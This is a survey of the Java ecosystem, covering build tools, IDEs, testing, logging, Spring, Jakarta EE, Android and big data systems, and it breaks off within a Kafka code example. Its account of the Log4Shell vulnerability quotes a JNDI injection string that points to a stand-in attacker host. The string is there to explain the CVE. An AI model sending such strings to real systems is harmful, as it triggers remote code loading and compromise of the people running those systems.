# Java Ecosystem, Frameworks, and Applications

> The Java language is the seed crystal. The ecosystem is the mineral deposit
> that crystallized around it over three decades — tools, frameworks, runtimes,
> and a polyglot runtime that became the bedrock of enterprise computing,
> mobile, and the entire big data revolution.

Java the language matters, but Java the *ecosystem* is why Java still runs
the world's banks, airline reservation systems, trading desks, Android phones,
data lakes, and most of the infrastructure underneath modern search, streaming,
and analytics. This document surveys that ecosystem: build tools, package
management, IDEs, testing and logging, the Spring universe, Jakarta EE,
modern lightweight frameworks, ORMs, Android, big data infrastructure, the
JVM as a polyglot runtime, financial and trading systems, enterprise patterns,
and observability.

---

## 1. Build Tools

Build tools in the Java world evolved in three generations: XML-driven
task runners (Ant), convention-over-configuration declarative builds
(Maven), and programmable incremental build engines (Gradle, Bazel). Each
generation solved real pain from the previous one, and all three still
ship software in 2026.

### Apache Ant (2000)

Ant, first released by James Duncan Davidson in 2000 as a utility
extracted from the Tomcat build, was Java's first widely-adopted build
tool. It replaced Make for Java projects: Make's tab-sensitive rules and
Unix-centric assumptions were a poor fit for cross-platform Java.

Ant is XML-based and *task-oriented*. A `build.xml` is a list of targets,
each containing a sequence of tasks (`<javac>`, `<jar>`, `<copy>`,
`<junit>`). Targets declare dependencies on other targets. There is no
built-in notion of a project layout, no dependency manager, no repository.
You wrote, by hand, the classpath for every compile step.

```xml
<project name="hello" default="jar">
  <target name="compile">
    <mkdir dir="build/classes"/>
    <javac srcdir="src" destdir="build/classes"/>
  </target>
  <target name="jar" depends="compile">
    <jar destfile="build/hello.jar" basedir="build/classes"/>
  </target>
</project>
```

Ant later got **Apache Ivy** (2004) as a bolt-on dependency manager, but
by then Maven was eating the market. Ant is still maintained and still
shows up in long-lived enterprise projects, legacy Apache projects, and
some Eclipse-era tooling builds.

### Apache Maven (2004)

Maven, born out of Jason van Zyl's frustration with Ant's repetition on
the Apache Turbine project, introduced three ideas that changed Java
forever: **convention over configuration**, a **standard project
layout** (`src/main/java`, `src/test/java`, `target/`), and a **central
repository** for declared dependencies.

A Maven project is described by a `pom.xml` (Project Object Model). You
don't write tasks; you declare facts — groupId, artifactId, version,
packaging, dependencies — and Maven's lifecycle (`validate`, `compile`,
`test`, `package`, `verify`, `install`, `deploy`) does the work.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.tibsfox.research</groupId>
  <artifactId>java-ecosystem-demo</artifactId>
  <version>1.0.0-SNAPSHOT</version>
  <packaging>jar</packaging>

  <properties>
    <maven.compiler.source>21</maven.compiler.source>
    <maven.compiler.target>21</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>

  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-web</artifactId>
      <version>3.3.4</version>
    </dependency>
    <dependency>
      <groupId>org.junit.jupiter</groupId>
      <artifactId>junit-jupiter</artifactId>
      <version>5.10.2</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.assertj</groupId>
      <artifactId>assertj-core</artifactId>
      <version>3.25.3</version>
      <scope>test</scope>
    </dependency>
  </dependencies>
</project>
```

The coordinate system `groupId:artifactId:version` (often called a "GAV")
is the universal identifier for a Java artifact. These coordinates resolve
against **Maven Central** (`repo.maven.apache.org`), the single largest
software repository in history by artifact count, with roughly 10 million+
artifacts across hundreds of thousands of unique libraries. Every developer
has a local cache at `~/.m2/repository` — a content-addressed mirror of
whatever slice of Maven Central their projects depend on.

**POM inheritance** lets a parent `pom.xml` define defaults (dependency
versions, plugins, properties) that child modules inherit. **BOM** (Bill
of Materials) is a pattern where a POM's sole purpose is to fix versions
for a family of related artifacts — Spring Boot's `spring-boot-dependencies`
BOM is the canonical example.

Publishing to Maven Central went through Sonatype OSSRH for years; in 2024
it migrated to the **Sonatype Central Portal**, which uses a namespace
verification + deployment bundle model. GPG signing has always been
mandatory for Central.

### Gradle (2007)

Gradle, created by Hans Dockter, took the lessons of both Ant (flexibility)
and Maven (declarative structure) and added a *programmable* build model
written first in **Groovy DSL**, later with a **Kotlin DSL**. Gradle's
killer features are **incremental builds**, a **build cache**, a persistent
**daemon** process, task avoidance via input/output fingerprinting, and
parallel task execution.

```kotlin
// build.gradle.kts
plugins {
    id("org.springframework.boot") version "3.3.4"
    id("io.spring.dependency-management") version "1.1.6"
    kotlin("jvm") version "1.9.25"
    kotlin("plugin.spring") version "1.9.25"
}

group = "com.tibsfox.research"
version = "1.0.0-SNAPSHOT"

java {
    toolchain {
        languageVersion.set(JavaLanguageVersion.of(21))
    }
}

repositories {
    mavenCentral()
}

dependencies {
    implementation("org.springframework.boot:spring-boot-starter-web")
    implementation("org.springframework.boot:spring-boot-starter-data-jpa")
    implementation("org.jetbrains.kotlin:kotlin-reflect")
    runtimeOnly("org.postgresql:postgresql")
    testImplementation("org.springframework.boot:spring-boot-starter-test")
    testImplementation("org.assertj:assertj-core")
}

tasks.withType<Test> {
    useJUnitPlatform()
}
```

Gradle became **Android's official build tool** when Android Studio
shipped in 2013, guaranteeing it a vast install base. Gradle 8.x is
current (8.10 as of late 2024), featuring the configuration cache,
Kotlin DSL as default for new projects, and improved support for Java 21.
Gradle's learning curve is steeper than Maven's because the DSL is a
programming language — which is both its power and its tax.

### Bazel

Google's Bazel (open-sourced from internal "Blaze" in 2015) brings
**hermetic, reproducible** builds and first-class **monorepo** support
to Java (and C++, Go, Python, Rust, Scala, Kotlin, and more). Bazel's
selling point is *correctness at scale*: if you change one file in a
10,000-target monorepo, Bazel rebuilds only the transitively affected
targets and can cache results across machines via a remote cache and
remote execution.

Bazel's learning curve is steep and its community is smaller than
Maven's or Gradle's, but for companies with monorepos measured in
millions of files it is often the only realistic option.

### sbt and Mill (Scala ecosystem)

**sbt** ("simple build tool") is the de facto Scala build tool,
interactive and incremental, with its own Scala-flavored DSL. It is
powerful but famously esoteric — sbt is the kind of tool whose error
messages inspire long Stack Overflow threads.

**Mill**, by Li Haoyi, is a newer Scala build tool that pitches itself
as "what sbt should have been": cleaner model, faster, more debuggable,
and expressible as plain Scala object hierarchies.

Both sbt and Mill can build pure Java projects, but in practice Java
shops stick with Maven or Gradle.

---

## 2. Maven Central and the Dependency Ecosystem

Maven Central is the single most important artifact of the Java
ecosystem. It is a write-once, never-delete repository — once a version
is published, it is immutable. Deletions require out-of-band intervention
and are rare. This immutability is why every Java build, regardless of
build tool, can pin dependencies by coordinate and expect reproducibility
for years.

### Coordinates and Resolution

A dependency is identified by `groupId:artifactId:version[:classifier][:type]`.
The groupId is conventionally a reversed DNS name
(`org.springframework.boot`, `com.google.guava`). The artifactId is the
project name. Versions can be release versions (`3.3.4`) or
**SNAPSHOT** versions (`1.0.0-SNAPSHOT`) — SNAPSHOTs are mutable and
meant for ongoing development; they are deployed to a snapshots repository,
not to Central.

### Transitive Dependencies and Conflict Resolution

When you declare one dependency, Maven and Gradle transitively pull in
*its* dependencies, and so on. A realistic Spring Boot project may have
200+ transitive JARs. Conflicts arise when two paths through the
dependency graph yield different versions of the same artifact. Maven's
resolution is **nearest-wins** (shortest path in the dependency tree);
Gradle's is **highest-version-wins** by default but with rich overrides.

### Scopes

Maven scopes determine when a dependency is on the classpath:

- `compile` — default, on all classpaths.
- `provided` — available at compile/test but *not* packaged (e.g., the
  servlet API when deploying to a servlet container).
- `runtime` — not needed for compilation, needed at runtime (JDBC drivers).
- `test` — only on the test classpath (JUnit, AssertJ, Mockito).
- `system` — deprecated, direct file reference.
- `import` — only valid in `<dependencyManagement>`, used to import BOMs.

### Log4Shell: the Ecosystem's Nightmare

On December 9, 2021, CVE-2021-44228 ("Log4Shell") was disclosed. A
remote code execution vulnerability in Apache Log4j 2 — a transitive
dependency of an enormous fraction of Java software — let attackers
execute arbitrary code by sending a crafted string like
`${jndi:ldap://evil.example.com/a}` to anything that logged it. Because
Log4j 2 was pulled transitively into thousands of products, the response
required every Java shop on Earth to audit their dependency trees, patch,
and redeploy. It was arguably the most impactful single CVE in Java's
history, and it permanently raised awareness of supply-chain risk in the
Maven Central ecosystem. Tools like Dependabot, Renovate, and Sonatype
Nexus IQ / OSS Index became standard.

---

## 3. IDEs

### IntelliJ IDEA (JetBrains, 2001)

IntelliJ IDEA is the dominant Java IDE. Developed by JetBrains since 2001,
it exists in a free **Community** edition and a paid **Ultimate** edition.
Its distinguishing features are deep static analysis, thousands of
inspections, reliable and aggressive refactorings, tight debugger
integration, and excellent support for Kotlin (also a JetBrains product),
Scala (via plugin), and virtually every Java framework. Android Studio,
Google's official Android IDE, is a fork of IntelliJ Community.

### Eclipse (2001)

Eclipse started inside IBM and was open-sourced in 2001. Its Java
Development Tools (JDT) includes a custom incremental Java compiler
(`ecj`) used independently by many tools. Eclipse is plugin-heavy — at
one point virtually every Java framework shipped an Eclipse plugin — and
its long tail of extensions made it the standard enterprise IDE for much
of the 2000s. Eclipse still drives the **Eclipse JDT Language Server**
(jdt.ls), which powers Java support in VS Code, Neovim, and many other
editors via the Language Server Protocol.

### NetBeans (1996)

NetBeans began as a Czech student project, was acquired by Sun
Microsystems in 1999 as Sun's reference IDE, and was donated to the
Apache Software Foundation in 2016 after Oracle's acquisition of Sun.
NetBeans pioneered the *Swing-based IDE* model and was known for a
clean out-of-the-box experience — Java EE, profiling, and GUI builders
all worked without plugin hunting.

### VS Code + Red Hat Java Extension Pack

Microsoft's VS Code, combined with the Red Hat Java extension pack
(which bundles the Eclipse JDT Language Server, Debugger for Java,
Maven, Gradle, and Test Runner extensions), has become the popular
lightweight alternative. It is especially common for polyglot
microservice work where developers switch between Java, TypeScript,
Python, and infrastructure files.

### Educational IDEs

**BlueJ** (University of Kent, 1999) and **DrJava** (Rice University)
are pedagogical IDEs designed to teach OO concepts visually.
**Greenfoot**, also from Kent, extends BlueJ for 2D simulation teaching.
They're niche but have shaped how many students first meet the
language.

### Language Server Protocol

Microsoft's LSP (2016) decouples language intelligence from editor UI.
For Java, the reference server is **Eclipse JDT LS**, an extraction of
Eclipse's Java brain as a headless process. This means a developer in
Vim can get the same rename-refactoring and inspection coverage that an
Eclipse user gets — at least in theory.

---

## 4. Testing Frameworks

### JUnit

**JUnit** is the foundational Java test framework. Created by Kent Beck
and Erich Gamma in 1997 (emerging from Beck's earlier SUnit for
Smalltalk), it operationalized the **TDD** style that Beck had been
advocating. JUnit 3 used naming conventions (`testFoo` methods in
`TestCase` subclasses). JUnit 4 (2006) brought annotations (`@Test`,
`@Before`, `@After`), parameterization, and a pluggable runner model.
JUnit 5 (Jupiter, 2017) was a ground-up rewrite into three modules —
Platform, Jupiter, Vintage — supporting Java 8 lambdas, nested test
classes, dynamic tests, and a modern extension model.

```java
// src/test/java/com/tibsfox/demo/CalculatorTest.java
package com.tibsfox.demo;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class CalculatorTest {

    private final Calculator calc = new Calculator();

    @Test
    @DisplayName("addition: two positive integers")
    void addsPositiveIntegers() {
        assertThat(calc.add(2, 3)).isEqualTo(5);
    }

    @Test
    @DisplayName("division by zero throws ArithmeticException")
    void divisionByZeroThrows() {
        assertThatThrownBy(() -> calc.divide(10, 0))
                .isInstanceOf(ArithmeticException.class)
                .hasMessageContaining("zero");
    }

    @Test
    void fluentChainedAssertions() {
        var result = calc.computeStats(java.util.List.of(1, 2, 3, 4, 5));
        assertThat(result)
                .isNotNull()
                .satisfies(r -> {
                    assertThat(r.sum()).isEqualTo(15);
                    assertThat(r.average()).isEqualTo(3.0);
                    assertThat(r.max()).isEqualTo(5);
                });
    }
}
```

### TestNG

**TestNG**, by Cedric Beust in 2004, was originally JUnit's faster-moving
competitor. It introduced features JUnit 4 lacked: dependent tests,
flexible test grouping, data providers, parallel execution, and a richer
reporting model. JUnit 5 closed most of those gaps, and TestNG is now
mostly used in projects that started with it.

### Mockito

**Mockito**, by Szczepan Faber in 2008, is the de facto mocking library.
`mock(Foo.class)`, `when(...).thenReturn(...)`, `verify(...)` — the API
became a lingua franca for Java unit tests. Modern Mockito supports
mocking of static methods and final classes.

### AssertJ, Hamcrest, Spock

**AssertJ** provides fluent, chainable, discoverable assertions
(`assertThat(list).containsExactly("a", "b")`) and has eclipsed Hamcrest
in new code. **Hamcrest** was the original matcher library built into
JUnit 4. **Spock** is a Groovy-based BDD framework with a given/when/then
block structure and very readable failure messages; it is popular in
shops that use Groovy or Grails.

### BDD, Integration, and Architecture Tests

- **Cucumber JVM** — Gherkin `.feature` files bind to Java step
  definitions, often used for acceptance testing with non-developer
  stakeholders.
- **RestAssured** — fluent DSL for testing REST APIs.
- **Testcontainers** — starts real PostgreSQL, Kafka, Redis, Elasticsearch,
  and hundreds of other services in ephemeral Docker containers for
  integration tests. Eliminates the "install PostgreSQL on every dev
  machine" problem and became standard in the 2020s.
- **WireMock** — HTTP service virtualization; mock external APIs with
  fidelity.
- **ArchUnit** — writes architectural rules as unit tests ("nothing in
  `com.acme.domain` may depend on `com.acme.web`").

---

## 5. Logging

Logging in Java has a rich, contentious history involving the same
person twice: **Ceki Gülcü** wrote Log4j 1 at IBM, then left, wrote
**SLF4J** (a logging facade) and **Logback** (a successor implementation).

- **Log4j 1** (1999) — the original, now end-of-life.
- **Log4j 2** (Apache) — modern rewrite with async appenders, garbage-free
  steady state, and a plugin system. Also the source of Log4Shell.
- **SLF4J** (Simple Logging Facade for Java) — an API facade that lets
  libraries log without committing to an implementation. A library
  depends on `slf4j-api`; the application chooses the backend (Logback,
  Log4j 2, JUL).
- **Logback** — Ceki's successor to Log4j 1, SLF4J's native
  implementation, default in Spring Boot through 2.x.
- **java.util.logging (JUL)** — bundled with the JDK, disliked for its
  awkward configuration but used in places that avoid extra dependencies.
- **tinylog** — a lightweight alternative emphasizing minimal footprint.

A typical modern setup: application and libraries log through SLF4J's
API, the classpath contains `logback-classic` (or `log4j-slf4j2-impl` for
Log4j 2), and configuration lives in `logback-spring.xml` or
`log4j2.xml`.

### Log4Shell Revisited

Log4Shell (CVE-2021-44228) exploited a feature called **JNDI Lookup** in
Log4j 2 that allowed log messages to trigger JNDI lookups, including
remote class loading via LDAP. A log statement like
`log.info("user: {}", userAgent)` could execute attacker code if the
User-Agent header contained a JNDI string. The root cause was treating
log message content as trusted input for feature resolution — a
subtle interaction between a convenience feature and user-controlled
strings. The fallout reshaped how Java shops think about library
defaults, feature flags, and dependency audits.

---

## 6. Spring Framework

Spring is the single most influential Java framework, measured by both
install base and cultural impact.

### Origins

**Rod Johnson** published *Expert One-on-One J2EE Design and Development*
(Wrox, 2002), a 700-page indictment of the then-dominant J2EE EJB stack.
The book included a small `interface21` framework demonstrating an
alternative: plain Java objects (**POJOs**), dependency injection, and
lightweight configuration. Readers started using the sample code as
their primary framework. Johnson, Juergen Hoeller, and Yann Caroff turned
it into **Spring Framework**, released 1.0 in March 2004.

### Core Ideas

- **IoC container** — a central registry of "beans" (managed objects)
  and their dependencies, wired automatically.
- **Dependency injection** — beans declare what they need; the container
  provides it. This replaced the EJB JNDI-lookup pattern.
- **AOP** — Aspect-Oriented Programming for cross-cutting concerns like
  transactions, security, and caching, implemented via proxies.
- **Data access** — `JdbcTemplate`, exception translation, and
  integration with Hibernate/JPA.
- **Spring MVC** — web framework with `@Controller`, `@RequestMapping`,
  model-view rendering, and REST.
- **Transactions** — declarative `@Transactional` that works across
  JDBC, JPA, JMS.

### Spring Boot (2014)

**Spring Boot**, released in 2014, was the inflection point. It shipped
three key ideas:

1. **Starters** — curated dependency bundles (`spring-boot-starter-web`)
   that bring in a consistent, tested set of libraries.
2. **Auto-configuration** — if H2 is on the classpath, configure an
   in-memory DataSource; if Kafka is on the classpath, configure a
   KafkaTemplate. Opinionated defaults you can override.
3. **Embedded servers** — package your application as an executable JAR
   with embedded Tomcat, Jetty, or Undertow. `java -jar app.jar` is now
   a whole production web server.

```java
// src/main/java/com/tibsfox/demo/HelloController.java
package com.tibsfox.demo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
public class DemoApplication {
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }
}

@RestController
@RequestMapping("/api")
class HelloController {

    @GetMapping("/hello")
    public Greeting hello() {
        return new Greeting("world", System.currentTimeMillis());
    }

    @GetMapping("/hello/{name}")
    public Greeting helloName(@PathVariable String name) {
        return new Greeting(name, System.currentTimeMillis());
    }
}

record Greeting(String name, long timestampMs) {}
```

The combination "annotations over XML, embedded server,
`@SpringBootApplication`" killed XML configuration as the default in
new Java projects and made Spring Boot the dominant web framework of
the 2010s. **Spring Initializr** (`start.spring.io`) lets developers
generate a working project with one HTTP call.

### Spring Ecosystem

- **Spring Data** — repository abstraction over JPA, MongoDB, Redis,
  Elasticsearch, Cassandra, R2DBC. Declare an interface; Spring
  generates the implementation.
- **Spring Security** — authentication and authorization: form login,
  OAuth2, JWT, LDAP, SAML, method-level security.
- **Spring Cloud** — microservices patterns: Config Server, Eureka
  service discovery, Gateway, Resilience4j circuit breakers, Sleuth
  tracing.
- **Spring WebFlux** — reactive alternative to Spring MVC, built on
  **Project Reactor** (`Mono<T>` and `Flux<T>`). Non-blocking
  Netty-backed servers.
- **Spring Batch** — framework for large-scale batch processing: chunked
  reads, retry, skip, restart.
- **Spring for GraphQL** — integration with `graphql-java` as a
  first-class Spring module.

### Corporate Home

Spring's commercial home has moved: **Interface21 → SpringSource → VMware
(via the 2009 SpringSource acquisition) → Pivotal (2013 spinoff) → VMware
(2020 reabsorption) → Broadcom** (2023 after the VMware acquisition).
Through all those transitions the open-source project has remained
healthy, largely because the core team (Juergen Hoeller and successors)
stayed together.

### Spring Data JpaRepository

```java
// src/main/java/com/tibsfox/demo/repository/ProductRepository.java
package com.tibsfox.demo.repository;

import com.tibsfox.demo.domain.Product;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.stereotype.Repository;

import java.math.BigDecimal;
import java.util.List;
import java.util.Optional;

@Repository
public interface ProductRepository extends JpaRepository<Product, Long> {

    // Derived query — Spring generates the JPQL from the method name
    Optional<Product> findBySku(String sku);

    List<Product> findByPriceLessThanOrderByPriceAsc(BigDecimal maxPrice);

    // Custom JPQL
    @Query("""
            select p from Product p
            where p.category = :category
              and p.stock > 0
            order by p.name
            """)
    List<Product> findAvailableInCategory(String category);
}
```

No implementation code. Spring Data inspects the interface at startup,
generates a proxy that translates method names and `@Query` annotations
into JPA queries, and registers it as a bean.

---

## 7. Jakarta EE (formerly Java EE / J2EE)

Before Spring, enterprise Java meant the Sun **J2EE** specification
stack: **Servlets** (1997), **JSP**, **EJB** (Enterprise JavaBeans), and
over time **JMS**, **JPA**, **JSF**, **JAX-RS**, **JAX-WS**, **CDI**,
**JTA**, **Bean Validation**. These were specifications, not
implementations — the idea being that multiple vendors
(BEA WebLogic, IBM WebSphere, Oracle App Server, Sun GlassFish) could
implement the spec and users could switch between them.

### Naming Timeline

- **J2EE 1.2 (1999) through J2EE 1.4 (2003)** — the original era.
  Heavy, XML-configuration-driven, EJB 2.x (with its notorious
  home/remote interface ceremony). Programming it felt like filling out
  tax forms.
- **Java EE 5 (2006) through Java EE 8 (2017)** — annotation-driven,
  EJB 3.x (dramatically simplified), JPA, CDI. Much more humane.
- **Jakarta EE 8 (2019)** — identical to Java EE 8 but after Oracle
  donated the whole platform to the **Eclipse Foundation**. Oracle kept
  the "Java" trademark, which is why the platform had to rename.
- **Jakarta EE 9 (2020)** — the notorious `javax.*` → `jakarta.*` package
  rename. Every `import javax.servlet.*;` became `import jakarta.servlet.*;`.
  Mechanical change but massive coordination cost for the ecosystem.
- **Jakarta EE 10 (2022), Jakarta EE 11 (2024)** — moving forward under
  Eclipse governance.

### Core APIs

- **Servlet** — HTTP request/response abstraction.
- **JSP / JSF** — server-side rendering (JSF is component-based).
- **JPA (Jakarta Persistence)** — ORM specification.
- **EJB (Jakarta Enterprise Beans)** — transactional business
  components; still present but rarely chosen for new work.
- **JMS (Jakarta Messaging)** — messaging API.
- **JAX-RS (Jakarta REST)** — REST API framework (`@Path`, `@GET`).
- **CDI (Contexts and Dependency Injection)** — DI framework spec.
- **JTA** — transaction API.
- **Bean Validation** — constraints via annotations (`@NotNull`, `@Min`).

### Application Servers

- **Apache Tomcat** — servlet container only, not a full Jakarta EE
  server, but far and away the most popular runtime because most apps
  only need servlets.
- **Eclipse Jetty** — lightweight servlet container, often embedded.
- **Undertow** — JBoss's high-performance non-blocking server.
- **WildFly** (Red Hat, formerly JBoss AS) — full Jakarta EE server.
- **GlassFish** — Sun's / Oracle's / now Eclipse's reference
  implementation.
- **Open Liberty** — IBM's open-source server, modular by design.
- **Payara** — GlassFish fork with commercial support.
- **Apache TomEE** — Tomcat plus Jakarta EE extras.
- **Resin** — Caucho Technology, retired in 2022.

### MicroProfile

**MicroProfile**, started in 2016 at an Eclipse community meetup, is a
Jakarta EE subset plus microservice-focused extras: **Config**,
**Metrics**, **Health**, **OpenAPI**, **JWT Auth**, **Rest Client**,
**Fault Tolerance**. It evolves faster than Jakarta EE proper and
targets the microservices/Kubernetes use case.

---

## 8. Modern Lightweight Frameworks

The post-Spring-Boot generation targets **fast startup**, **low memory**,
and **GraalVM native images** — all driven by serverless and Kubernetes
pressure to minimize cold-start latency and per-pod RAM.

### Quarkus (Red Hat, 2019)

Tagline: *"Supersonic Subatomic Java"*. Quarkus does as much work as
possible at build time instead of runtime — classpath scanning,
dependency injection wiring, Hibernate metadata, config parsing — so the
runtime starts in tens of milliseconds. First-class **GraalVM Native
Image** support means a Quarkus application can compile to a native
binary with ~20 MB RAM footprint and ~10ms startup. Quarkus is
Jakarta EE + MicroProfile compliant and uses familiar APIs (CDI,
JAX-RS, JPA).

### Micronaut (Object Computing, 2018)

Micronaut, from Graeme Rocher (the creator of Grails), takes a similar
compile-time approach: DI and AOP are resolved at compile time via
annotation processors, not reflection. No reflection means great
GraalVM compatibility, small memory, fast startup. Ships its own
cloud-native stack (service discovery, config, tracing).

### Helidon (Oracle, 2018)

**Helidon SE** is a reactive functional API ("no magic"); **Helidon MP**
is MicroProfile-compliant. Helidon 4 (2023) moved to **virtual threads**
(Java 21's Project Loom) as its primary concurrency model instead of
reactive streams — a significant architectural bet.

### Dropwizard

**Dropwizard** (originally from Yammer, ~2011) is an opinionated
operations framework that bundles Jetty + Jersey (JAX-RS) + Jackson +
Metrics + Liquibase + Logback. Pre-dates Spring Boot and established
the "embedded server + fat JAR" pattern that Spring Boot later
popularized.

### Javalin, Spark Framework, Vert.x

- **Javalin** — lightweight Kotlin/Java web framework on top of Jetty.
  Sinatra-inspired.
- **Spark Framework** (not to be confused with Apache Spark) — another
  Sinatra-style micro framework.
- **Eclipse Vert.x** — polyglot, reactive event-loop runtime modeled
  after Node.js but running on the JVM. Supports Java, Kotlin, Groovy,
  Ruby, JavaScript.

---

## 9. ORM and Data Access

### Hibernate and JPA

**Hibernate**, created by **Gavin King** in 2001, was Java's first
successful ORM. Hibernate treated objects as the primary model and
generated SQL from HQL (Hibernate Query Language). It became so popular
that Sun used it as the seed for the **Java Persistence API (JPA)**
standard, released with Java EE 5 in 2006. Today Hibernate is the
reference implementation of JPA (along with EclipseLink).

JPA uses annotations on POJOs:

```java
@Entity
@Table(name = "products")
public class Product {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column(nullable = false, unique = true)
    private String sku;
    private BigDecimal price;
    // ...
}
```

### Other Data Access Tools

- **EclipseLink** — the JPA reference implementation after Oracle
  donated TopLink to Eclipse.
- **MyBatis** (formerly iBatis) — SQL mapping, not ORM. You write SQL;
  MyBatis maps results to objects. Popular in shops that want control
  over their queries.
- **jOOQ** — type-safe SQL DSL in Java, generating Java classes from the
  live database schema. Lukas Eder's philosophy: "Use Java as if it were
  SQL". Commercially supported.
- **Spring Data JPA** — repository abstraction on top of JPA
  (see section 6).
- **R2DBC** — Reactive Relational Database Connectivity, non-blocking
  JDBC alternative for reactive stacks (Spring WebFlux, Quarkus Reactive).
- **Lettuce / Jedis** — Redis clients. Lettuce is reactive and
  Netty-based; Jedis is synchronous.
- **MongoDB Java Driver** — official, with both sync and reactive
  variants.

---

## 10. Android

### Origins

**Android Inc.** was founded in 2003 by Andy Rubin, Rich Miner, Nick Sears,
and Chris White. Google acquired the company in 2005, formed the **Open
Handset Alliance** with hardware partners in November 2007, and released
**Android 1.0** in September 2008 on the HTC Dream (T-Mobile G1).

### The Dalvik/ART Architecture

Android needed Java-the-language for developer adoption but didn't want
to ship Oracle's JVM on phones. The solution was **Dalvik**, a new VM
designed for low-memory devices, with a register-based architecture (vs
Java's stack-based bytecode). Java source code is compiled to `.class`
files with `javac`, then transformed to `.dex` (Dalvik Executable)
bytecode by a tool called `dx` (later `d8`). In Android 5.0 (2014),
Dalvik was replaced with **ART** (Android Runtime), which adds
ahead-of-time compilation.

This made Android both a Java-compatible platform *and* something
entirely separate from Oracle's JVM — a distinction that became legally
significant.

### Google v. Oracle (2010–2021)

In 2010, Oracle (which had just acquired Sun) sued Google for using the
Java API in Android. The lawsuit dragged on for over a decade, including
two Federal Circuit reversals, and finally reached the Supreme Court,
which ruled 6–2 in April 2021 that Google's use of ~11,500 lines of Java
API declarations was **fair use**. The decision preserved the norm that
*reimplementing* an API is legal — a foundational principle for open
ecosystems from UNIX onward.

### Android Studio and Jetpack

**Android Studio** launched in 2013, based on IntelliJ IDEA Community,
and replaced Eclipse ADT as Google's official IDE. The **Jetpack**
libraries (2018) bundled official Android support libraries under a
versioned `androidx.*` namespace, separating them from the OS release
cycle.

### Kotlin on Android

Google announced **Kotlin** as an officially supported Android language
at Google I/O 2017 and in 2019 declared Kotlin **"Kotlin-first"** for
Android. Most new Android code today is Kotlin, though billions of
lines of existing Java Android code continue to ship.

---

## 11. Big Data and Data Infrastructure

An extraordinary fraction of modern data infrastructure is Java or runs
on the JVM. There are reasons for this historical accident and it is
worth understanding.

### Why Java Dominated Big Data

- **Excellent multi-threading** — mature `java.util.concurrent`, lock-free
  primitives, `CompletableFuture`.
- **Production-grade garbage collection** — G1, ZGC, Shenandoah handle
  multi-terabyte heaps.
- **Huge ecosystem** — Netty, Guava, Jackson, Lucene, the whole Apache
  Commons family. You can compose from components.
- **Cross-platform** — the same JAR runs on Linux, macOS, Windows, Solaris.
- **Enterprise acceptance** — Java was already blessed by every IT
  department in 2006.
- **The "enterprise" word did the work** — Hadoop got into
  data centers because it was Java, not in spite of it.

### The Core Stack

- **Apache Hadoop** (Doug Cutting and Mike Cafarella, 2006) — HDFS
  distributed filesystem, MapReduce compute, later YARN resource
  manager. Seeded the entire big data industry. Cutting was at Yahoo!
  at the time and the project was open-sourced via Apache.
- **Apache Spark** (Matei Zaharia, AMPLab Berkeley, 2009; Databricks
  founded 2013) — in-memory distributed compute, RDDs and DataFrames.
  Written in **Scala** but exposing Java, Python (PySpark), and R APIs.
  Replaced MapReduce as the default heavy-lift engine.
- **Apache Kafka** (LinkedIn, open-sourced 2011) — distributed event
  streaming platform. Log-structured, high-throughput, now the de facto
  nervous system for real-time data pipelines. Scala and Java.
  Confluent, founded by the Kafka creators, is the commercial steward.
- **Apache Flink** (originally Stratosphere, TU Berlin, ~2009; top-level
  Apache 2014) — true streaming (not micro-batch), event-time semantics,
  exactly-once processing. Operated by Ververica / Alibaba / data
  Artisans. Java.
- **Apache Cassandra** (Facebook, 2008; Apache 2009) — wide-column
  distributed NoSQL, inspired by Dynamo and Bigtable. DataStax is the
  commercial steward. Java.
- **Elasticsearch** (Shay Banon, 2010) — distributed search and
  analytics engine on top of Lucene. Java. Elastic NV runs the
  commercial stack.
- **Apache Lucene** (Doug Cutting, 1999) — the original Java search
  library. Still the underlying index for Elasticsearch and Solr.
- **Apache Solr** — enterprise search built on Lucene, Java.
- **Neo4j** — property-graph database, Cypher query language, Java.
- **Apache Beam** — unified batch/stream programming model, originally
  Google Cloud Dataflow SDK.
- **Apache NiFi** — visual dataflow automation, NSA-originated.
- **Trino** (formerly PrestoSQL) and **Presto** (Facebook, 2012) —
  distributed SQL query engines that can read from HDFS, S3, Hive, many
  other sources. Java. Trino is the community fork after the
  founders left Facebook.
- **Apache Druid** — real-time OLAP analytics database.
- **Apache ZooKeeper** — distributed coordination service (leader
  election, config). Java.
- **Apache HBase** — wide-column NoSQL on HDFS, modeled after Bigtable.

### Kafka Producer Example

```java
// src/main/java/com/tibsfox/demo/kafka/OrderProducer.java
package com.tibsfox.demo.kafka;

import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerConfig;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.clients.producer.RecordMetadata;
import org.apache.kafka.common.serialization.StringSerializer;

import java.util.Properties;
import java.util.concurrent.ExecutionException;

public class OrderProducer {

    public static void main(String[] args) throws ExecutionException, InterruptedException {
        Properties props = new Properties();
        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        props.put(ProducerConfig.ACKS_CONFIG, "all");
        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, "true");
        props.put(ProducerConfig.LINGER_MS_CONFIG, "5");
